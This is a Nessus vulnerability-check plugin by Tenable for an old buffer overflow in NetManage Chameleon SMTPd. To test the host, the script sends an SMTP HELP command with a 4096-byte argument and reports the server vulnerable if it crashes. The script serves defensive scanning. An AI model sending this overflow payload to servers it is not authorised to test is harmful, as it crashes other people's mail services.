#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10042);
 script_version("$Revision: 1.39 $");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");

 script_cve_id("CVE-1999-0261");
 script_bugtraq_id(2387);
 script_osvdb_id(36);

 script_name(english:"NetManage Chameleon SMTPd Remote Overflow DoS");
 script_summary(english:"Determines if smtpd can be crashed");

 script_set_attribute(attribute:"synopsis", value:"The remote SMTP server has a buffer overflow vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running NetManage Chameleon SMTPd.

This version of the software has a remote buffer overflow
vulnerability. Nessus crashed the service by issuing a long argument
to the HELP command. A remote attacker could exploit this issue to
crash the service, or possibly execute arbitrary code.

There is also a buffer overflow related to the HELO command, but
Nessus has not checked for this issue.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1998/May/26");
 script_set_attribute(attribute:"solution", value:"Upgrade to the latest version of this software.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value:"1998/05/04");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"SMTP problems");
 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");

 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/smtp", 25);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("smtp_func.inc");
include("misc_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_service(svc: "smtp", default: 25, exit_on_fail: 1);
if (get_kb_item('SMTP/'+port+'/broken'))
 exit(1, "The MTA on port "+port+" is broken.");

soc = open_sock_tcp(port);

if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

 b = smtp_recv_banner(socket:soc);
c = 'HELP ' + crap(4096) + '\r\n';
 send(socket:soc, data:c);
 close(soc);

if (service_is_dead(port: port, exit: 1) > 0)
  security_hole(port);

